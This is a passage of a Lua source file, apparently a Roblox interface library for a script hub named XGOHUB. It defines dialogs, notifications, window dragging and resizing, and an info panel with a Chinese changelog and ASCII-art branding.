					else
						Library:Tween(Buttons, Library.TweenLibrary.SmallEffect, {
							Size = UDim2.new(0, 350, 0, (UIListLayout.AbsoluteContentSize.Y + 25)),
						})

						Library:Tween(Dialog, Library.TweenLibrary.SmallEffect, {
							Size = UDim2.new(0.05, 395, 0.05, Title.AbsoluteSize.Y + Buttons.AbsoluteSize.Y + 45),
						})
					end
				end
			end)

			local Input

			Input = Library.UserInputService.InputBegan:Connect(function(input, t)
				if
					input.UserInputType == Enum.UserInputType.MouseButton1
					or input.UserInputType == Enum.UserInputType.Touch
				then
					if not AntiTouch then
						task.cancel(Thread)
						CloseBackground()
						table.foreach(ListFunctions, function(_, v)
							v()
						end)
						Input:Disconnect()
					end
				end
			end)

			table.insert(ListFunctions, function()
				Dialog.Active = false

				Library:Tween(Dialog, Library.TweenLibrary.SmallEffect, {
					BackgroundTransparency = 1,
					Size = UDim2.new(0.1, 250, 0.1, 100),
				})

				Library:Tween(DropShadow, Library.TweenLibrary.SmallEffect, {
					ImageTransparency = 1,
				})

				Library:Tween(UIStroke, Library.TweenLibrary.SmallEffect, {
					Transparency = 1,
				})
				Library:Tween(Title, Library.TweenLibrary.SmallEffect, {
					TextStrokeTransparency = 1,
					TextTransparency = 1,
				})

				Library:Tween(Content, Library.TweenLibrary.SmallEffect, {
					TextStrokeTransparency = 1,
					TextTransparency = 1,
				})

				task.delay(1, function()
					Dialog:Destroy()
				end)
			end)

			WindowLibrary.DialogStopTask = function()
				Already = true

				Input:Disconnect()
				task.cancel(Thread)
				CloseBackground()
				table.foreach(ListFunctions, function(_, v)
					v()
				end)
			end

			for i, v in pairs(setup.Buttons) do
				v.Callback = v.Callback or function() end
				v.Title = v.Title or "Button"

				local Frame = Instance.new("Frame")
				local UIStroke = Instance.new("UIStroke")
				local DropShadow = Instance.new("ImageLabel")
				local TextLabel = Instance.new("TextLabel")
				local Button = Instance.new("TextButton")

				Frame.Parent = Buttons
				Frame.BackgroundColor3 = Library.Colors.Default
				Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Frame.BorderSizePixel = 0
				Frame.Size = UDim2.new(0.469999999, 0, 0, 25)
				Frame.ZIndex = 285
				Frame.BackgroundTransparency = 1

				if #setup.Buttons <= 6 then
					Frame.Size = UDim2.new(0.469999999, 0, 0, 25)
				else
					Frame.Size = UDim2.new(0, 100, 0, 25)
				end

				Library:Tween(Frame, Library.TweenLibrary.SmallEffect, {
					BackgroundTransparency = 0.15,
				})

				UIStroke.Transparency = 1
				UIStroke.Color = Color3.fromRGB(156, 156, 156)
				UIStroke.Parent = Frame

				Library:Tween(UIStroke, Library.TweenLibrary.SmallEffect, {
					Transparency = 0.850,
				})

				DropShadow.Name = "DropShadow"
				DropShadow.Parent = Frame
				DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				DropShadow.BackgroundTransparency = 1.000
				DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
				DropShadow.Position = UDim2.new(0, -5, 0, -5)
				DropShadow.Rotation = 0.010
				DropShadow.Size = UDim2.new(1, 10, 1, 10)
				DropShadow.ZIndex = 284
				DropShadow.Image = "rbxassetid://297694300"
				DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
				DropShadow.ImageTransparency = 1
				DropShadow.ScaleType = Enum.ScaleType.Slice
				DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
				DropShadow.SliceScale = 0.050

				Library:Tween(DropShadow, Library.TweenLibrary.SmallEffect, {
					ImageTransparency = 0.500,
				})

				TextLabel.Parent = Frame
				TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
				TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel.BackgroundTransparency = 1.000
				TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel.BorderSizePixel = 0
				TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
				TextLabel.Size = UDim2.new(0.99000001, 0, 0.550000012, 0)
				TextLabel.ZIndex = 295
				TextLabel.Font = Enum.Font.Gotham
				TextLabel.Text = v.Title
				TextLabel.TextColor3 = Library.Colors.TextColor
				TextLabel.TextScaled = true
				TextLabel.TextSize = 14.000
				TextLabel.TextStrokeColor3 = Color3.fromRGB(220, 224, 234)
				TextLabel.TextStrokeTransparency = 1
				TextLabel.TextWrapped = true
				TextLabel.TextTransparency = 1
				TextLabel.RichText = true

				Library:Tween(TextLabel, Library.TweenLibrary.SmallEffect, {
					TextStrokeTransparency = 0.950,
					TextTransparency = 0,
				})

				Button.Name = "Button"
				Button.Parent = Frame
				Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Button.BackgroundTransparency = 1.000
				Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Button.BorderSizePixel = 0
				Button.Size = UDim2.new(1, 0, 1, 0)
				Button.ZIndex = 350
				Button.Font = Enum.Font.SourceSans
				Button.TextColor3 = Color3.fromRGB(0, 0, 0)
				Button.TextSize = 14.000
				Button.TextTransparency = 1.000

				table.insert(ListFunctions, function()
					Library:Tween(TextLabel, Library.TweenLibrary.SmallEffect, {
						TextStrokeTransparency = 1,
						TextTransparency = 1,
						ZIndex = -10,
					})

					Library:Tween(DropShadow, Library.TweenLibrary.SmallEffect, {
						ImageTransparency = 1,
						ZIndex = -10,
					})

					Library:Tween(UIStroke, Library.TweenLibrary.SmallEffect, {
						Transparency = 1,
					})

					Library:Tween(Frame, Library.TweenLibrary.SmallEffect, {
						BackgroundTransparency = 1,
						ZIndex = -10,
					})

					Button.ZIndex = -100
					Button.Visible = false
					Button.Active = false
				end)

				if v.Hightlight then
					UIStroke.Color = Library.Colors.Hightlight
				end

				Library:MakeDrop(Frame, UIStroke, Library.Colors.Hightlight)

				Button.MouseButton1Click:Connect(function()
					if Already then
						return
					end

					WindowLibrary.DialogStopTask()

					v.Callback()
				end)
			end
		end
	end

	function WindowLibrary:GetRoot()
		return MainFrame
	end

	function WindowLibrary:Resize(udim: UDim2)
		Library:Tween(MainFrame, Library.TweenLibrary.SmallEffect, {
			Size = udim,
		})

		setup.Size = udim
	end

	function WindowLibrary:Destroy()
		ScreenGui:Destroy()
		BlurEle.Destroy()
		return true
	end

	CloseButton.MouseButton1Click:Connect(function()
		WindowLibrary:Dialog({
			Title = "-- 你要关闭脚本吗 --",
			Content = "关闭后不会隐藏\n请选择",
			Buttons = {
				{
					Title = "执意关闭",
					Callback = function()
						Library:Tween(MainFrame, Library.TweenLibrary.SmallEffect, {
							Size = UDim2.fromScale(0, 0),
							Position = UDim2.fromScale(0.5, 0.5),
						}).Completed
							:Connect(function()
								task.wait()
								WindowLibrary:Destroy()
								playSound(104269922408932)
							end)
					end,
				},
				{
					Title = "稍后再来",
				},
			},
		})
	end)

	local ToggleButton = Library:InputButton(Ico)

	ToggleButton.Visible = false

	local OnScreen = function()
		OpenDelay = tick()
		WindowLibrary.Toggle = true
		ToggleButton.Visible = false
		Library:Tween(Ico, Library.TweenLibrary.WindowChangedFast, { ImageTransparency = 1 })
		Library:Tween(Block, Library.TweenLibrary.SmallEffect, { Position = UDim2.new(0.5, 0, 0.5, 0) })
		if WindowLibrary.FullScreen then
			WindowLibrary.Status = "FullScreen"
			Library:Tween(MainFrame, Library.TweenLibrary.SmallEffect, {
				Size = UDim2.fromScale(1, 1),
				Position = UDim2.fromScale(0.5, 0.5),
			})
			MaxisizweButton.HoverImage = "rbxassetid://10734895530"
		else
			WindowLibrary.Status = "Show"
			Library:Tween(MainFrame, Library.TweenLibrary.SmallEffect, {
				Size = setup.Size,
				Position = WindowLibrary.SavedPosition or UDim2.fromScale(0.5, 0.5),
			})

			MaxisizweButton.HoverImage = "rbxassetid://7733992901"
		end
	end

	MaxisizweButton.MouseButton1Click:Connect(function()
		WindowLibrary.FullScreen = not WindowLibrary.FullScreen
		OnScreen()
	end)

	ToggleButton.MouseButton1Click:Connect(function()
		WindowLibrary.Toggle = true

		ToggleButton.Visible = false
		Library:Tween(Block, Library.TweenLibrary.WindowChangedFast, { Position = UDim2.new(0.5, 0, 0.5, 0) })
		Library:Tween(Ico, Library.TweenLibrary.WindowChangedFast, { ImageTransparency = 1 })

		OnScreen()
	end)

	local Min = function()
		WindowLibrary.Toggle = not WindowLibrary.Toggle

		if WindowLibrary.Toggle then
			ToggleButton.Visible = false
			Library:Tween(Block, Library.TweenLibrary.SmallEffect, { Position = UDim2.new(0.5, 0, 0.5, 0) })
			Library:Tween(Ico, Library.TweenLibrary.SmallEffect, { ImageTransparency = 1 })

			OnScreen()
		else
			OpenDelay = tick()
			ToggleButton.Visible = true
			Library:Tween(Ico, Library.TweenLibrary.WindowChangedFast, { ImageTransparency = 0.25 })

			Library:Tween(Block, Library.TweenLibrary.WindowChangedFast, { Position = UDim2.new(0.5, 0, -1.5, 0) })
			Library:Tween(MainFrame, Library.TweenLibrary.SmallEffect, {
				Size = Library.SizeLibrary.Close,
			})

			Library:Tween(MainFrame, Library.TweenLibrary.WindowChangedFast, {
				Position = UDim2.fromOffset(29, 27),
			})
		end
	end

	MinimizeButton.MouseButton1Click:Connect(Min)

	local dragToggle = nil
	local dragSpeed = 0.1
	local dragStart = nil
	local startPos = nil

	local function updateInput(input)
		Library:Tween(MainFrame, Library.TweenLibrary.SmallEffect, {
			Size = setup.Size,
			Position = WindowLibrary.SavedPosition or UDim2.fromScale(0.5, 0.5),
		})

		local delta = input.Position - dragStart
		local position =
			UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)

		if WindowLibrary.FullScreen then
			WindowLibrary.FullScreen = false
			MainFrame.Position = position
			startPos = position
		end

		WindowLibrary.SavedPosition = position

		game:GetService("TweenService"):Create(MainFrame, TweenInfo.new(dragSpeed), { Position = position }):Play()
	end

	Headers.InputBegan:Connect(function(input)
		if
			input.UserInputType == Enum.UserInputType.MouseButton1
			or input.UserInputType == Enum.UserInputType.Touch
		then
			dragToggle = true
			dragStart = input.Position
			startPos = MainFrame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	Library.UserInputService.InputBegan:Connect(function(input, Istype)
		if input.KeyCode == setup.Keybind and not Istype then
			Min()
		end
	end)

	local Resize = Instance.new("TextButton")
	local IsHold = false

	Resize.Name = "Resize"
	Resize.Parent = MainFrame
	Resize.AnchorPoint = Vector2.new(0.5, 0.5)
	Resize.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Resize.BackgroundTransparency = 1.000
	Resize.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Resize.BorderSizePixel = 0
	Resize.Position = UDim2.new(1, 0, 1, 0)
	Resize.Rotation = 0.010
	Resize.Size = UDim2.new(1, 0, 1, 0)
	--	Resize.Size = UDim2.new(0.075000003, 0, 0.075000003, 0)
	Resize.SizeConstraint = Enum.SizeConstraint.RelativeYY
	Resize.ZIndex = 100
	Resize.Font = Enum.Font.SourceSans
	Resize.Text = ""
	Resize.TextColor3 = Color3.fromRGB(0, 0, 0)
	Resize.TextSize = 14.000

	local NotificationBar = Instance.new("Frame")
	local UIListLayout = Instance.new("UIListLayout")

	NotificationBar.Name = "NotificationBar"
	NotificationBar.Parent = ScreenGui
	NotificationBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	NotificationBar.BackgroundTransparency = 1.000
	NotificationBar.BorderColor3 = Color3.fromRGB(27, 42, 53)
	NotificationBar.BorderSizePixel = 0
	NotificationBar.Position = UDim2.new(0, 10, 0, 10)
	NotificationBar.Size = UDim2.new(0, 200, 1, -20)
	NotificationBar.ZIndex = -1000

	UIListLayout.Parent = NotificationBar
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.Padding = UDim.new(0, 10)
	------------------------------------通知窗口1-------------------------------------------------------------------------------------------------------------
	function WindowLibrary:Notify(setup)
		setup = setup or {}
		setup.Title = setup.Title or "Norification"
		setup.Duration = setup.Duration or 5
		setup.Description = setup.Description or setup.Desc or "Description"

		local Notification = Instance.new("Frame")
		local DropShadow = Instance.new("ImageLabel")
		local Title = Instance.new("TextLabel")
		local Close = Instance.new("TextButton")
		local Message = Instance.new("TextLabel")

		local OpenAnimation = function()
			Library:Tween(Notification, Library.TweenLibrary.SmallEffect, {

				BackgroundTransparency = 0.3,
			})

			Library:Tween(DropShadow, Library.TweenLibrary.SmallEffect, {
				ImageTransparency = 0.500,
			})

			Library:Tween(Title, Library.TweenLibrary.SmallEffect, {
				TextStrokeTransparency = 0.950,
				TextTransparency = 0,
			})

			Library:Tween(Close, Library.TweenLibrary.SmallEffect, {
				TextStrokeTransparency = 0.950,
				TextTransparency = 0,
			})

			Library:Tween(Message, Library.TweenLibrary.SmallEffect, {
				TextStrokeTransparency = 0.950,
				TextTransparency = 0,
			})
		end

		local CloseAnimation = function()
			Library:Tween(Notification, Library.TweenLibrary.SmallEffect, {
				Size = UDim2.new(0, Notification.Size.X.Offset, 0, 0),
				BackgroundTransparency = 1,
			})

			Library:Tween(DropShadow, Library.TweenLibrary.WindowChangedFast, {
				ImageTransparency = 1,
			})

			Library:Tween(Title, Library.TweenLibrary.WindowChangedFast, {
				TextStrokeTransparency = 1,
				TextTransparency = 1,
			})

			Library:Tween(Close, Library.TweenLibrary.WindowChangedFast, {
				TextStrokeTransparency = 1,
				TextTransparency = 1,
			})

			Library:Tween(Message, Library.TweenLibrary.WindowChangedFast, {
				TextStrokeTransparency = 1,
				TextTransparency = 1,
			})
		end

		Notification.Name = "Notification"
		Notification.Parent = NotificationBar
		Notification.BackgroundColor3 = Library.Colors.Default
		Notification.BackgroundTransparency = 1
		Notification.BorderColor3 = Color3.fromRGB(27, 42, 53)
		Notification.BorderSizePixel = 0
		Notification.Size = UDim2.new(0, 400, 0, 250) -- 调整窗口的初始大小
		Notification.ZIndex = 0

		DropShadow.Name = "DropShadow"
		DropShadow.Parent = Notification
		DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DropShadow.BackgroundTransparency = 1.000
		DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
		DropShadow.Position = UDim2.new(0, -5, 0, -5)
		DropShadow.Size = UDim2.new(1, 10, 1, 10)
		DropShadow.ZIndex = -5
		DropShadow.Image = "rbxassetid://297694300"
		DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
		DropShadow.ImageTransparency = 1
		DropShadow.ScaleType = Enum.ScaleType.Slice
		DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
		DropShadow.SliceScale = 0.050

		Title.Name = "Title"
		Title.Parent = Notification
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.BorderColor3 = Color3.fromRGB(27, 42, 53)
		Title.BorderSizePixel = 0
		Title.Position = UDim2.new(0, 25, 0, 5)
		Title.Size = UDim2.new(1, -50, 0, 14)
		Title.ZIndex = 0
		Title.Font = Enum.Font.Gotham
		Title.Text = setup.Title
		Title.TextColor3 = Library.Colors.TextColor
		Title.TextScaled = true
		Title.TextSize = 14.000
		Title.TextStrokeColor3 = Color3.fromRGB(220, 224, 234)
		Title.TextStrokeTransparency = 1
		Title.TextWrapped = true
		Title.TextTransparency = 1
		Title.RichText = true

		Close.Name = "Close"
		Close.Parent = Notification
		Close.Active = false
		Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Close.BackgroundTransparency = 1.000
		Close.BorderColor3 = Color3.fromRGB(27, 42, 53)
		Close.BorderSizePixel = 0
		Close.Position = UDim2.new(1, -25, 0, 0)
		Close.Selectable = false
		Close.Size = UDim2.new(0, 25, 0, 25)
		Close.ZIndex = 0
		Close.Font = Enum.Font.Gotham
		Close.Text = "×"
		Close.TextColor3 = Color3.fromRGB(220, 224, 234)
		Close.TextSize = 20.000
		Close.TextStrokeColor3 = Color3.fromRGB(220, 224, 234)
		Close.TextStrokeTransparency = 0.950
		Close.TextTransparency = 1

		Message.Name = "Message"
		Message.Parent = Notification
		Message.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Message.BackgroundTransparency = 1.000
		Message.BorderColor3 = Color3.fromRGB(27, 42, 53)
		Message.BorderSizePixel = 0
		Message.Position = UDim2.new(0, 10, 0, 22)
		Message.Size = UDim2.new(1, -20, 1, 0)
		Message.ZIndex = 0
		Message.Font = Enum.Font.Gotham
		Message.Text = setup.Description
		Message.TextColor3 = Library.Colors.TextColor
		Message.TextSize = 12.000
		Message.TextStrokeColor3 = Color3.fromRGB(220, 224, 234)
		Message.TextStrokeTransparency = 0.950
		Message.TextWrapped = true
		Message.TextXAlignment = Enum.TextXAlignment.Left
		Message.TextYAlignment = Enum.TextYAlignment.Top
		Message.TextTransparency = 1
		Message.RichText = true

		local update = function()
			local size = Library:GetTextSize(Message.Text:gsub("<.->", ""), Message.TextSize, Message.Font)
			local SIZE2 = Library:GetTextSize(Title.Text:gsub("<.->", ""), Title.TextSize, Title.Font)

			local mainx = ((SIZE2.X > size.X) and SIZE2.X) or size.X
			Library:Tween(Notification, Library.TweenLibrary.BinEffect, {
				Size = UDim2.new(0, mainx + 35, 0, (10 + size.Y) + Title.AbsoluteSize.Y),
				BackgroundTransparency = 0.3,
			})
		end

		OpenAnimation()
		update()

		local attr = false
		Close.MouseButton1Click:Connect(function()
			attr = true
			CloseAnimation()

			task.delay(0.25, function()
				Notification:Destroy()
			end)
		end)

		spawn(function()
			update()

			task.wait(setup.Duration)
			if attr then
				return
			end

			CloseAnimation()

			task.delay(0.25, function()
				Notification:Destroy()
			end)
		end)
	end

	Resize.InputBegan:Connect(function(std)
		if std.UserInputType == Enum.UserInputType.MouseButton1 or std.UserInputType == Enum.UserInputType.Touch then
			IsHold = true
			if Library.UserInputService.TouchEnabled then
				Resize.Size = UDim2.new(0.15000003, 85, 0.15000003, 85)
			end
		end
	end)

	Resize.InputEnded:Connect(function(std)
		if std.UserInputType == Enum.UserInputType.MouseButton1 or std.UserInputType == Enum.UserInputType.Touch then
			IsHold = false
			Resize.Size = UDim2.new(0.075000003, 0, 0.075000003, 0)
		end
	end)

	Library.UserInputService.InputChanged:Connect(function(input)
		if
			IsHold
			and (
				input.UserInputType == Enum.UserInputType.MouseMovement
				or input.UserInputType == Enum.UserInputType.Touch
			)
		then
			if WindowLibrary.Toggle then
				local pios = input.Position

				local x = (pios.X - MainFrame.AbsolutePosition.X)
				local y = (pios.Y - MainFrame.AbsolutePosition.Y)

				if x < 460 then
					x = 460
				end
				if y < 310 then
					y = 310
				end

				local Offset = UDim2.new(0, x, 0, y)
				local plus = UDim2.fromOffset(-(MainFrame.AbsoluteSize.X - x) / 2, -(MainFrame.AbsoluteSize.Y - y) / 2)

				setup.Size = Offset

				Library:Tween(MainFrame, Library.TweenLibrary.FastEffect, {
					Size = Offset,
					Position = MainFrame.Position + plus,
				})

				WindowLibrary.SavedPosition = MainFrame.Position + plus
			end
		end

		if
			input.UserInputType == Enum.UserInputType.MouseMovement
			or input.UserInputType == Enum.UserInputType.Touch
		then
			if dragToggle then
				updateInput(input)
			end
		end
	end)

	do
		local infoIco = Instance.new("ImageButton")
		local card = Instance.new("Frame")
		local closeBtn = Instance.new("ImageButton")
		local img = Instance.new("ImageLabel")
		local scroll = Instance.new("ScrollingFrame")
		local msgLb = Instance.new("TextLabel")

		infoIco.Name = "InfoButton"
		infoIco.Parent = Headers
		infoIco.AnchorPoint = Vector2.new(1, 0.5)
		infoIco.Position = UDim2.new(0.99, 0, 0.5, 0)
		infoIco.Size = UDim2.new(0, 18, 0, 18)
		infoIco.BackgroundTransparency = 1
		infoIco.Image = "rbxassetid://7733964719"
		infoIco.ImageColor3 = Library.Colors.TextColor
		infoIco.ImageTransparency = 0.5
		infoIco.ZIndex = 20
		WindowLibrary:AddToolTip(infoIco, "查看作者留言 / 更新日志")

		function WindowLibrary:SetInfoText(newText: string)
			if rawget(self, "_infoMsgLb") then
				self._infoMsgLb.Text = newText
				task.wait()
				local h = self._infoMsgLb.TextBounds.Y + 10
				self._infoMsgLb.Size = UDim2.new(1, 0, 0, h)
				self._infoScroll.CanvasSize = UDim2.new(0, 0, 0, h)
			end
		end

		local blocker
		local isOpen = false

		local function buildDialog()
			if blocker then
				return
			end

			blocker = Instance.new("TextButton")
			blocker.Name = "InfoBlocker"
			blocker.Parent = ScreenGui
			blocker.AnchorPoint = Vector2.new(0.5, 0.5)
			blocker.Position = UDim2.new(0.5, 0, 0.5, 0)
			blocker.Size = UDim2.new(0, 320, 0, 220)
			blocker.BackgroundTransparency = 1
			blocker.Text = ""
			blocker.Visible = false
			blocker.ZIndex = 499
			blocker.Active = true

			card.Name = "InfoCard"
			card.Parent = blocker
			card.Size = UDim2.new(1, 0, 1, 0)
			card.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			card.BackgroundTransparency = 0.5
			card.BorderSizePixel = 1
			card.BorderColor3 = Color3.fromRGB(255, 0, 0)
			card.ClipsDescendants = true
			card.ZIndex = 500

			closeBtn = Instance.new("TextButton")
			closeBtn.Name = "CloseBtn"
			closeBtn.Parent = card
			closeBtn.AnchorPoint = Vector2.new(1, 0)
			closeBtn.Position = UDim2.new(1, -8, 0, 8)
			closeBtn.Size = UDim2.new(0, 24, 0, 24)
			closeBtn.BackgroundTransparency = 1
			closeBtn.Text = "「关闭」"      
			closeBtn.Font = Enum.Font.GothamBold
			closeBtn.TextSize = 18
			closeBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
			closeBtn.ZIndex = 501

			closeBtn.MouseButton1Click:Connect(function()
                    blocker.Visible = false
                    isOpen = false
            			end)
			closeBtn.MouseEnter:Connect(function()
                    closeBtn.TextTransparency = 0
        			end)
			closeBtn.MouseLeave:Connect(function()
                    closeBtn.TextTransparency = 0.3
			end)

			img.Name = "BgImage"
			img.Parent = card
			img.Size = UDim2.new(1, 0, 1, 0)
			img.BackgroundTransparency = 0
			img.Image = "rbxassetid://81428127111090"
			img.ScaleType = Enum.ScaleType.Slice
			img.SliceCenter = Rect.new(128, 128, 128, 128)
			img.ZIndex = 499

			scroll.Name = "Scroll"
			scroll.Parent = card
			scroll.AnchorPoint = Vector2.new(0.5, 0.5)
			scroll.Position = UDim2.new(0.5, 0, 0.5, 0)
			scroll.Size = UDim2.new(1, -30, 1, -50)
			scroll.BackgroundTransparency = 1
			scroll.BorderSizePixel = 0
			scroll.ScrollBarThickness = 5
			scroll.ScrollBarImageColor3 = Library.Colors.Hightlight
			scroll.ScrollBarImageTransparency = 0.6
			scroll.ZIndex = 501
			scroll.CanvasSize = UDim2.new(0, 0, 0, 0)

			msgLb.Name = "Message"
			msgLb.Parent = scroll
			msgLb.Size = UDim2.new(1, 0, 0, 0)
			msgLb.BackgroundTransparency = 1
			msgLb.Font = Enum.Font.Gotham
			msgLb.TextColor3 = Library.Colors.TextColor
			msgLb.TextSize = 14
			msgLb.TextWrapped = true
			msgLb.RichText = true
			msgLb.ZIndex = 502
			msgLb.TextXAlignment = Enum.TextXAlignment.Center
			msgLb.TextYAlignment = Enum.TextYAlignment.Top
			msgLb.Text = 
[[

<b>v1.2.0 更新摘要</b>
• 新增粒子星空背景
• 新增 40+ 主题配色
• 新增颜色选择器组件
• 优化拖拽手感与内存占用
• 新增切换按钮方框切换方法/去除了原有方法
• 优化了切换按钮的定义

<b>后续计划</b>
- 多语言包
- 自定义背景图
- 云端脚本市场
- 后续会重新做Ui粒子特效
- 可能会重做悬浮窗 | 添加快捷栏


感谢各位使用，如有 BUG 请反馈至 QQ群：259461151  -- XGOHUB 作者.星果XG

 /$$   /$$        /$$$$$$         /$$$$$$        /$$   /$$       /$$   /$$       /$$$$$$$ 
| $$  / $$       /$$__  $$       /$$__  $$      | $$  | $$      | $$  | $$      | $$__  $$
|  $$/ $$/      | $$  \__/      | $$  \ $$      | $$  | $$      | $$  | $$      | $$  \ $$
 \  $$$$/       | $$ /$$$$      | $$  | $$      | $$$$$$$$      | $$  | $$      | $$$$$$$ 
  >$$  $$       | $$|_  $$      | $$  | $$      | $$__  $$      | $$  | $$      | $$__  $$
 /$$/\  $$      | $$  \ $$      | $$  | $$      | $$  | $$      | $$  | $$      | $$  \ $$
| $$  \ $$      |  $$$$$$/      |  $$$$$$/      | $$  | $$      |  $$$$$$/      | $$$$$$$/
|__/  |__/       \______/        \______/       |__/  |__/       \______/       |_______/ 
                                                                                          
╔═╗╔═╦═══╦═══╦╗─╔╦╗─╔╦══╗
╚╗╚╝╔╣╔═╗║╔═╗║║─║║║─║║╔╗║
─╚╗╔╝║║─╚╣║─║║╚═╝║║─║║╚╝╚╗
─╔╝╚╗║║╔═╣║─║║╔═╗║║─║║╔═╗║
╔╝╔╗╚╣╚╩═║╚═╝║║─║║╚═╝║╚═╝║
╚═╝╚═╩═══╩═══╩╝─╚╩═══╩═══╝   

]]

			local function updateCanvas()
				local h = msgLb.TextBounds.Y + 10
				msgLb.Size = UDim2.new(1, 0, 0, h)
				scroll.CanvasSize = UDim2.new(0, 0, 0, h)
			end
			msgLb:GetPropertyChangedSignal("Text"):Connect(updateCanvas)
			updateCanvas()

			WindowLibrary._infoMsgLb = msgLb
			WindowLibrary._infoScroll = scroll

			Library.UserInputService.InputBegan:Connect(function(inp)
				if inp.KeyCode == Enum.KeyCode.Escape and isOpen then
					blocker.Visible = false
					isOpen = false
				end
			end)
		end

		infoIco.MouseButton1Click:Connect(function()
			buildDialog()
			isOpen = not isOpen
			blocker.Visible = isOpen
		end)
	end

	return WindowLibrary
end

return Library
